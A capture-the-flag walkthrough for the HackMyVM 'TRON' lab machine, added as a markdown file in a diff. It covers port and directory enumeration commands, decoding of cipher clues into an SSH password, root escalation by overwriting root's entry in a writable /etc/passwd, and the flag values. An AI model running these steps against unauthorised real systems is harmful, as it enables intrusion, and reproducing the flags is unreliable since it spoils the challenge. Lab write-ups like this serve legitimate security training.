@@ -1,0 +1,83 @@
+🧩 TRON Machine Walkthrough – HackMyVM
+Difficulty: Medium
+Goal: Gain user access via a series of encrypted clues and escalate to root by exploiting a writable /etc/passwd.
+Target IP: 192.168.1.136
+Test Date: 10/04/2025
+
+🔍 Initial Enumeration
+Full TCP port scan:
+
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.136
+Service and version detection on discovered ports:
+
+nmap -sCV -p22,80 192.168.1.136
+Discovered open ports:
+
+22/tcp – OpenSSH 7.9p1
+
+80/tcp – Apache httpd 2.4.38
+
+🧭 Web Enumeration and Clue Extraction
+A Gobuster scan revealed multiple endpoints:
+
+gobuster dir -u http://192.168.1.136/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -t 100 -k -r
+Relevant findings:
+
+/robots.txt
+
+/MCP
+
+/tron.txt → Contained Base64-encoded Brainfuck code
+
+Decoded /tron.txt revealed:
+
+Brainfuck output: player
+
+Further clue in /30513.txt:
+
+Reversed substitution cipher used
+
+HTML source of the main page included:
+
+<!-- kzhh:SbWP9q94ZtE9qD -->
+Using the cipher, the password for player was decoded as:
+
+SyWP9j94ZgE9jD
+
+🔑 Initial Access via SSH
+SSH login with valid credentials:
+
+ssh player@192.168.1.136
+# Password: SyWP9j94ZgE9jD
+Access successful. Retrieved:
+
+user.txt → HMVMuserplayer2021
+
+⬆️ Privilege Escalation via Writable /etc/passwd
+Writable files were identified:
+
+find /etc -type f -writable 2>/dev/null
+Confirmed /etc/passwd was writable. A new password hash was created:
+
+openssl passwd hola
+# Result: 2w0G/hIEd5E42
+The /etc/passwd file was edited to replace root’s line:
+
+root:2w0G/hIEd5E42:0:0:root:/root:/bin/bash
+Switched to root with the new password:
+
+su root
+# Password: hola
+Access granted with full root privileges.
+
+🏁 Flag Retrieval
+
+user.txt → HMVMuserplayer2021
+
+root.txt → HMVMMasterControlProgram2021
+
+🎯 Conclusion
+The TRON machine was compromised through a creative combination of web-based clue decoding and poor file permission management. The writable /etc/passwd allowed for a manual password injection, granting root access without the need for kernel-level exploits.
+
+This highlights how even seemingly minor misconfigurations, such as writable critical system files, can lead to a full system compromise when combined with clever reconnaissance and decoding skills.
+
